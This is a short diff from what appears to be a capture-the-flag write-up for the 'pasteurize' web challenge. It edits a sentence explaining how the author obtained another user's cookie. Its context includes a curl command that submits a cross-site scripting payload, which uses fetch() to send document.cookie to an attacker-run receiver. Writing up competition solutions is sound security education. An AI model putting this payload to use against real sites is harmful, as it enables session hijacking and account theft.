@@ -81,7 +81,7 @@ const clean = DOMPurify.sanitize(note);
 
 ```
 
-We use pipedream.com to host our http receive server. We then use the following payload to obtain cookie of Mike:
+We use pipedream.com to host our http receive server. We then use the following payload to post the payload, share it with Mike and obtain his cookie:
 
 ```bash
 curl -v https://pasteurize.web.ctfcompetition.com/ -d "content[]=;fetch('https://REDACT/'%2bdocument.cookie);"
